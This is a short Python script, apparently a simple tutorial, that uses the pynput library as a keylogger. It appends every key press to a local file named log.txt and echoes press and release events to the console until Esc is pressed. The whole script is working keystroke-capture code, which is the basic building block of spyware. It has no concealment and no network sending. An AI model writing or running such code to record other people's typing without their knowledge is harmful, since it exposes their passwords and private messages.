from pynput import keyboard

colxn = "start_here: "

def write_to_file(key_log_value):
    f = open("log.txt", "a")
    f.write(key_log_value)
    f.close()

def on_press(key):
    try:
        write_to_file(str(key))
        print('Alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('Special Key {0} pressed'.format(key))


def on_release(key):
    print('{0} released'.format(key))
    if key == keyboard.Key.esc:
        # Stop The Listener
        return False

# Collect Events Until Released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
